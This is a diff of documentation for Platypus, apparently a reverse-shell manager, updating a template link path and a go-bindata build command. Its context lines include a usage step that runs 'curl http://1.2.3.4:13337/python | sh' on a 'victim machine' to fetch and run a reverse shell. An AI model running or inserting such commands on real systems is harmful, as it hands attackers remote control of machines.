@@ -33,7 +33,7 @@ Once the command gets executed, the reverse shell session will appear in platypu
 
 ## Specifying language of reverse shell command (default: bash)
 
-Also, you can specify the specific language of creating a reverse shell. All available languages are listed at [templates](https://github.com/WangYihang/Platypus/tree/master/lib/runtime/template/rsh)
+Also, you can specify the specific language of creating a reverse shell. All available languages are listed at [templates](https://github.com/WangYihang/Platypus/tree/master/assets/template/rsh)
 
 1. Start platypus and listen to any port (eg: 1.2.3.4 13337)
 2. Execute `curl http://1.2.3.4:13337/python | sh` on the victim machine
@@ -57,5 +57,5 @@ Then you should use `go-bindata` to add the template file as an asset of Platypu
 
 ```
 go get -u github.com/go-bindata/go-bindata/...
-go-bindata -pkg resource -o ./internal/util/resource/resource.go ./internal/runtime/... ./html/dist
+go-bindata -pkg assets -o ./internal/util/assets/assets.go ./assets/config.example.yml ./assets/template/rsh/... ./web/ttyd/dist/... ./web/frontend/build/... ./build/termite/...
 ```
